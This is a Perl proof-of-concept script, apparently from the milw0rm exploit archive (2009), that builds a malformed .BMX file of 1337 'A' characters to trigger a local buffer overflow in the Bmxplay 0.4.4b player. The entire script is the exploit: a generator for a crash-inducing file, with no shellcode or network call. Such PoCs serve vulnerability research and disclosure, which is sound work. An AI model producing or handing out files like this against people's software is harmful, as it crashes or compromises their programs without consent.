#####################################################################################################
#                    Bmxplay 0.4.4b (.BMX File) Local Buffer Overflow PoC
#                 Discovered by SirGod  -  www.mortal-team.net & www.h4cky0u.org
#               Downlaod : http://www.brothersoft.com/bmxplay-download-235557.html
######################################################################################################
my $chars= "A" x 1337;
my $file="sirgod.bmx";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file was created";
print "SirGod - www.mortal-team.net & www.h4cky0u.org";

# milw0rm.com [2009-05-04]
